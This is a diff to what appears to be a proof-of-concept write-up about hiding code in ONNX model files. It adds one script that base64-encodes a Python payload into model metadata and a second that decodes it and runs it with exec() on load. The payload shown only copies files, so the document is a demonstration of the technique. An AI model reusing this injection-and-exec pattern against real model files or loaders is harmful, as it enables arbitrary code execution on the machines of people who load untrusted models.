@@ -19,7 +19,12 @@ When executed (via exec()), the payload:
 
 # 🔬 Attack Flow
 1. Payload Injection into Model
+   
+<pre> <code>```python # inject_payload.py import onnx from onnx import helper import base64 # Load existing ONNX model model = onnx.load("model_base.onnx") # Define raw Python payload (to create 10 copies of the model) raw_payload = ''' import shutil for i in range(10): shutil.copyfile("infected_model.onnx", f"copy_{i}.onnx") ''' # Encode payload in Base64 and inject into metadata encoded_payload = base64.b64encode(raw_payload.encode()).decode() model.metadata_props.append(helper.StringStringEntryProto(key="run", value=encoded_payload)) # Save the infected model onnx.save(model, "infected_model.onnx") print("[+] Payload injected successfully.") ```</code> </pre>
+
 2. Payload Triggered on Load
+   
+<pre> <code>```python # simulate_load.py import onnx import base64 # Load the infected ONNX model model = onnx.load("infected_model.onnx") # Execute the payload from metadata for prop in model.metadata_props: if prop.key == "run": exec(base64.b64decode(prop.value)) ```</code> </pre>
 
 # 🧪 Test Results
 Upon loading:
